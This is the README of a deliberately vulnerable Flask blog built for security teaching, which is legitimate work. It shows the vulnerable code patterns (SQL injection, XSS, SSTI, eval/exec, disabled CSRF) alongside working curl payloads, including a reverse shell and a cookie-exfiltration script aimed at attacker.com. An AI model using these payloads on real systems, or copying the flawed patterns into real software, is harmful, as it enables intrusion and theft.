# VulnBlog - Deliberately Vulnerable Blog/CMS Platform

![Security Warning](https://img.shields.io/badge/Security-VULNERABLE%20BY%20DESIGN-critical)
![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
![Flask](https://img.shields.io/badge/Flask-2.3.0-green)

**EDUCATIONAL USE ONLY - Contains intentional security vulnerabilities**

## Overview

VulnBlog is a deliberately vulnerable blogging platform designed to demonstrate common web application security flaws. It features multi-user blogging with posts, comments, and custom themes.

### Vulnerability Count: 12+

- **XSS (Stored/Reflected):** 4 instances
- **CSRF:** 3 instances  
- **SSTI:** 2 instances
- **RCE:** 3 instances
- **SQL Injection:** 2 instances
- **Auth/Session Issues:** 2 instances

## Quick Start

### Local Execution

```bash
cd /home/diaz/workspace/CS5374/DVPP/projects/vulnblog

# Install dependencies
pip install -r requirements.txt

# Run the application
python run.py

# Access at http://localhost:5001
```

### Docker Deployment

```bash
# Build and run with Docker Compose
docker-compose up --build

# Access at http://localhost:5001
```

## Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Administrator |
| blogger | password | Blogger |
| user | user | Regular User |

## Architecture

```
vulnblog/
├── app/
│   ├── models/          # Database models (User, Post, Comment)
│   ├── services/        # Business logic with SSTI/RCE
│   ├── utils/           # Helpers (broken CSRF, auth)
│   └── views/           # Routes (auth, blog, admin)
├── data/                # SQLite database storage
├── config.py            # Vulnerable configuration
├── run.py               # Application entry point
└── docker-compose.yml   # Container deployment
```

## Vulnerability Details

### 1. SQL Injection (2 instances)

**Location:** `app/models/user.py`, `app/models/post.py`

```python
# CVE Reference: CVE-2025-64459 (Django SQLi)
# Exploit: username=' OR '1'='1'--
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Test:**
```bash
curl -X POST http://localhost:5001/auth/login \
  -d "username=admin'--&password=anything"
```

### 2. Cross-Site Scripting - XSS (4 instances)

**Location:** `app/models/user.py` (bio), `app/models/post.py` (title/content), `app/models/comment.py`

```python
# CVE Reference: CVE-2021-42053 (django-unicorn XSS)
# Stored XSS in post title
Post.create("<script>alert(1)</script>", content, author_id)
```

**Test:**
```bash
# Inject XSS in post
curl -X POST http://localhost:5001/posts/create \
  -b "session=..." \
  -d "title=<img src=x onerror=alert(document.cookie)>&content=Test"

# Inject XSS in comment
curl -X POST http://localhost:5001/posts/1/comment \
  -b "session=..." \
  -d "content=<script>fetch('/admin/users').then(r=>r.text()).then(alert)</script>"
```

### 3. Server-Side Template Injection - SSTI (2 instances)

**Location:** `app/services/template_service.py`, `app/views/admin.py`

```python
# CVE Reference: CVE-2019-8341 (Jinja2), CVE-2023-29689 (Pyro CMS)
# RCE via SSTI
template = Template(user_input)  # VULN
result = template.render(context)
```

**Test:**
```bash
# SSTI to RCE
curl -X POST http://localhost:5001/admin/render \
  -b "session=..." \
  -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"

# Alternative payload
curl -X POST http://localhost:5001/admin/render \
  -b "session=..." \
  -d "template={{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}"
```

### 4. Remote Code Execution - RCE (3 instances)

**Location:** `app/services/template_service.py`

```python
# CVE Reference: CVE-2023-0297 (PyLoad), CVE-2024-42845 (Invesalius3)
# RCE via eval
result = eval(user_expr)  # VULN

# RCE via exec
exec(user_code)  # VULN
```

**Test:**
```bash
# RCE via eval
curl -X POST http://localhost:5001/admin/evaluate \
  -b "session=..." \
  -d "expr=__import__('os').system('cat /etc/passwd')"

# RCE via exec
curl -X POST http://localhost:5001/admin/execute \
  -b "session=..." \
  -d "code=import socket,subprocess,os;print('shell ready')"
```

### 5. Cross-Site Request Forgery - CSRF (3 instances)

**Location:** `app/utils/csrf.py` (protection disabled)

```python
# CVE Reference: CVE-2015-7293 (Zope), CVE-2025-28062 (ERPNext)
def validate_csrf_token():
    return True  # VULN: Always passes
```

**Test:**
```html
<!-- Malicious page: csrf_delete_post.html -->
<img src="http://localhost:5001/admin/themes/activate/2">
<form action="http://localhost:5001/posts/1/comment" method="POST">
  <input name="content" value="<script>alert('CSRF')</script>">
</form>
<script>document.forms[0].submit();</script>
```

### 6. Authentication/Session Issues (2 instances)

**Location:** `app/utils/auth_helper.py`

```python
# CVE Reference: CVE-2013-4200 (Plone session hijacking)
# Session fixation - no regeneration
def login_user(user):
    session['user_id'] = user['id']  # VULN: No session.regenerate()
```

**Attacks:**
- Session fixation
- Admin bypass via session manipulation
- No session timeout

## Exploitation Scenarios

### Scenario 1: Account Takeover via SQLi

```bash
# 1. Bypass login
curl -X POST http://localhost:5001/auth/login \
  -d "username=admin'--&password=x" \
  -c cookies.txt

# 2. Access admin panel
curl http://localhost:5001/admin/users -b cookies.txt
```

### Scenario 2: RCE via SSTI Chain

```bash
# 1. Login as admin
# 2. Create malicious theme
curl -X POST http://localhost:5001/admin/themes/create \
  -b cookies.txt \
  -d "name=evil&template={{ config.__class__.__init__.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }}"

# 3. Activate theme (triggers RCE)
curl -X POST http://localhost:5001/admin/themes/activate/3 -b cookies.txt
```

### Scenario 3: Stored XSS to Session Hijacking

```bash
# 1. Inject XSS payload in comment
curl -X POST http://localhost:5001/posts/1/comment \
  -b cookies.txt \
  -d "content=<script>fetch('http://attacker.com/?c='+document.cookie)</script>"

# 2. Wait for admin to view post
# 3. Capture admin session cookie
```

## CVE Mappings

| Vulnerability | Similar CVE | Source |
|---------------|-------------|--------|
| SQL Injection | CVE-2025-64459 | Django 5.1.13 |
| XSS | CVE-2021-42053 | django-unicorn |
| SSTI | CVE-2019-8341 | Jinja2 2.10 |
| SSTI | CVE-2023-29689 | Pyro CMS 3.9 |
| RCE eval | CVE-2023-0297 | PyLoad 0.9.7 |
| RCE exec | CVE-2024-42845 | Invesalius3 |
| CSRF | CVE-2015-7293 | Zope 4.3.7 |
| CSRF | CVE-2025-28062 | ERPNext 14.82.1 |
| Session Hijack | CVE-2013-4200 | Plone <4.1.3 |
| Auth Bypass | CVE-2022-37109 | Raspberry Pi cam |
| Auth Control | CVE-2022-31125 | Roxy WI |

## API Endpoints

### Authentication
- `POST /auth/login` - Login (SQLi vulnerable)
- `POST /auth/register` - Register (XSS in bio)
- `POST /auth/logout` - Logout (no CSRF)
- `GET /auth/profile` - View profile
- `POST /auth/profile/update` - Update bio (XSS)

### Blog
- `GET /` - Homepage
- `GET /posts/<id>` - View post (XSS display)
- `POST /posts/create` - Create post (XSS, no CSRF)
- `POST /posts/<id>/comment` - Add comment (XSS)
- `GET /search?q=<term>` - Search (SQLi)

### Admin
- `GET /admin/users` - List users
- `POST /admin/render` - Render template (SSTI)
- `POST /admin/evaluate` - Eval expression (RCE)
- `POST /admin/execute` - Exec code (RCE)
- `GET /admin/themes` - List themes
- `POST /admin/themes/create` - Create theme (SSTI)
- `POST /admin/themes/activate/<id>` - Activate (CSRF)

## Docker Information

**Image:** python:3.11-slim  
**Port:** 5001  
**Volumes:** `./data:/app/data` (persistent database)  
**Environment:** DEBUG=True, CSRF disabled

## Security Warnings

### Never:
- Deploy to production
- Use on public networks
- Store real data
- Use as reference for secure code

### Always:
- Run in isolated environments
- Use for education only
- Keep ports localhost-only
- Destroy after testing

## Educational Value

This project demonstrates:
1. **Input Validation Failures** - XSS, SQLi, SSTI
2. **Broken Authentication** - Session fixation, weak checks
3. **Missing Security Controls** - No CSRF, no sanitization
4. **Dangerous Functions** - eval(), exec(), Template()
5. **Insecure Design** - Client-side security, no defense-in-depth

## Testing with vulnhuntr

```bash
cd /home/diaz/workspace/CS5374/vulnhuntr

# Scan VulnBlog
vulnhuntr -r /home/diaz/workspace/CS5374/DVPP/projects/vulnblog

# Expected findings:
# - SQL Injection in user.py, post.py
# - SSTI in template_service.py
# - RCE in template_service.py (eval/exec)
# - XSS in models (no escaping)
```

## License

MIT License - For educational purposes only.

---

**Part of the DVPP (Deliberately Vulnerable Python Projects) Lab**  
**Project 2/8** - See main README for full lab documentation
